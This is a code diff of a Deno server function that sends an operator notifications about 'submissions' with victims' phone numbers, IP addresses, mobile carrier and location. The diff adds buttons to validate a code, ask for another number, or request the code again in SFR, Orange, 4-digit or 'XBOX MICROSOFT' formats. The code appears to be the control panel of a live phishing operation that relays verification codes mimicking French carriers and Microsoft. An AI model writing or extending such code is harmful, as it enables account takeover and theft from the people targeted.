@@ -34,14 +34,13 @@ Deno.serve(async (req) => {
   const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
   const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
 
-  // These links call triggerSendCode with the action param
-  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
-  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
-  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
-
-  // Create a simple blacklist URL with base64 encoding
-  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
-  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;
+  const validUrl        = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
+  const wrongUrl        = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
+  const resend4Url      = `${appUrl}/?triggerAction=code_ready&id=${submissionId}`;
+  const resendSFRUrl    = `${appUrl}/?triggerAction=code6sfr&id=${submissionId}`;
+  const resendOrangeUrl = `${appUrl}/?triggerAction=code6orange&id=${submissionId}`;
+  const resendXboxUrl   = `${appUrl}/?triggerAction=code6&id=${submissionId}`;
+  const blacklistUrl    = `${appUrl}/?triggerAction=blacklist&id=${submissionId}&ip=${encodeURIComponent(ip)}`;
 
   let country = "Inconnue";
   let city = "Inconnue";
@@ -84,7 +83,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "Actions",
-        value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n⏰ [**Renvoyer au code**](${expiredUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
+        value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n🔁 [**Renvoyer (4 chiffres)**](${resend4Url})\n🔢 [**Renvoyer (SFR FORMAT)**](${resendSFRUrl})\n🔢 [**Renvoyer (ORANGE FORMAT)**](${resendOrangeUrl})\n🔢 [**Renvoyer (XBOX MICROSOFT)**](${resendXboxUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
         inline: false
       },
     ],
